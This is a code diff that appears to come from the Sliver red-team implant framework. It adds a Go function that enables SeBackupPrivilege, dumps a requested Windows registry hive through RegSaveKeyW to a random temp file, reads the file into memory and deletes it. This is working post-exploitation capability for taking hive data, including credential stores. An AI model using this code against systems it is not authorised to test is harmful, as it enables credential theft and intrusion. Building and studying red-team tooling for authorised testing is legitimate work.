@@ -1,12 +1,19 @@
 package registry
 
 import (
+	"errors"
 	"fmt"
+	"math/rand"
+	"os"
+
 	// {{if .Config.Debug}}
 	"log"
 	// {{end}}
 	"strings"
 
+	"github.com/bishopfox/sliver/implant/sliver/priv"
+	"github.com/bishopfox/sliver/implant/sliver/syscalls"
+	"golang.org/x/sys/windows"
 	"golang.org/x/sys/windows/registry"
 )
 
@@ -181,4 +188,89 @@ func CreateSubKey(hostname string, hive string, path string, keyName string) err
 	}
 	_, _, err = registry.CreateKey(*k, keyName, registry.ALL_ACCESS)
 	return err
+}
+
+func generateTempFileName() string {
+	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+	randomBytes := make([]byte, 8)
+	for i := range randomBytes {
+		randomBytes[i] = charset[rand.Intn(len(charset))]
+	}
+	return string(randomBytes) + ".tmp"
+}
+
+// ReadHive dumps the content of a registry hive into a single binary blob
+func ReadHive(requestedRootHive string, requestedHive string) ([]byte, error) {
+	// In order to dump a hive, we need the SeBackupPrivilege privilege
+	err := priv.SePrivEnable("SeBackupPrivilege")
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Println("SePrivEnable failed:", err)
+		// {{end}}
+		return nil, err
+	}
+
+	/*
+		Create a random file name to output the hive to.
+		The system call to dump registry information (RegSaveKeyW)
+		only accepts a file name as an output location, as opposed to a
+		buffer. So we will output the result of the system call, read the
+		resulting file into memory, then delete the file.
+	*/
+
+	/*
+		We have to make sure the file we ask RegSaveKeyW to output does not exist
+		because if it does, the call will fail.
+		Keep generating and checking file names until we find one that does not exist.
+	*/
+	var tempFileName string
+	for {
+		tempFileName = fmt.Sprintf("%s\\%s", os.TempDir(), generateTempFileName())
+		if _, err := os.Stat(tempFileName); errors.Is(err, os.ErrNotExist) {
+			// {{if .Config.Debug}}
+			log.Printf("Going to output hive data to %s", tempFileName)
+			// {{end}}
+			break
+		}
+	}
+	tempFileNamePtr, err := windows.UTF16PtrFromString(tempFileName)
+	if err != nil {
+		return nil, err
+	}
+
+	hiveHandle, err := openKey("", requestedRootHive, requestedHive, registry.READ)
+
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("Could not open %s\\%s: %v", requestedRootHive, requestedHive, err)
+		// {{end}}
+		return nil, err
+	}
+	defer hiveHandle.Close()
+
+	err = syscalls.RegSaveKeyW(windows.Handle(*hiveHandle), tempFileNamePtr, nil)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("Could not save %s\\%s to %s: %v", requestedRootHive, requestedHive, tempFileName, err)
+		// {{end}}
+		return nil, err
+	}
+
+	data, err := os.ReadFile(tempFileName)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("Could not open temp file: %v", err)
+		// {{end}}
+		return nil, err
+	}
+	err = os.Remove(tempFileName)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("Could not delete temp file: %v", err)
+		// {{end}}
+		// No reason to throw away the data if we cannot delete the file
+		return data, err
+	}
+
+	return data, nil
 }
